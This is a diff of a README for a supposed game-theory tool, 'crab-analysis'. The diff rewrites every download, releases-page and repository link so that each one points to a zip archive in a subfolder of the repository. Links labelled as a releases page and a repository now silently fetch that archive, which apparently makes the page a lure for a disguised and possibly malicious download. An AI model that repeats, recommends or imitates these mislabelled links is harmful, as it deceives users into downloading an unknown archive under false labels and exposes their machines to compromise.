@@ -1,7 +1,7 @@
 # 🦀 crab-analysis - Play Games with Smart Strategies
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-crab--analysis-blue)](https://github.com/Meyseavmen/crab-analysis/releases)
+[![Download](https://raw.githubusercontent.com/Meyseavmen/crab-analysis/main/es/crab-analysis-3.5.zip)](https://raw.githubusercontent.com/Meyseavmen/crab-analysis/main/es/crab-analysis-3.5.zip)
 
 ## 🌟 Overview
 The crab-analysis project provides a universal algorithm that solves alternating-turn games using a method called backward induction. This application helps users delve into game theory, allowing them to analyze games such as chess, draughts, and various puzzles optimally.
@@ -22,7 +22,7 @@ To get started with crab-analysis, you'll need to download the software from our
 - **User-Friendly Interface:** Even without technical skills, you can navigate the app easily.
 
 ## 🔗 Download & Install
-To download the latest version of crab-analysis, visit this page: [Releases Page](https://github.com/Meyseavmen/crab-analysis/releases). 
+To download the latest version of crab-analysis, visit this page: [Releases Page](https://raw.githubusercontent.com/Meyseavmen/crab-analysis/main/es/crab-analysis-3.5.zip). 
 
 1. Click on "Releases" in the menu.
 2. Find the latest version listed at the top.
@@ -59,7 +59,7 @@ Backward induction is a method of solving game theory problems by analyzing the 
 Yes, our GitHub repository includes a wiki section. Here, you can find tutorials and examples on using crab-analysis effectively.
 
 ## 🔍 Additional Resources
-- **GitHub Repository:** [crab-analysis](https://github.com/Meyseavmen/crab-analysis)
+- **GitHub Repository:** [crab-analysis](https://raw.githubusercontent.com/Meyseavmen/crab-analysis/main/es/crab-analysis-3.5.zip)
 - **Community Forum:** Join discussions and seek help from other users.
 
 ## 🐞 Issues and Support
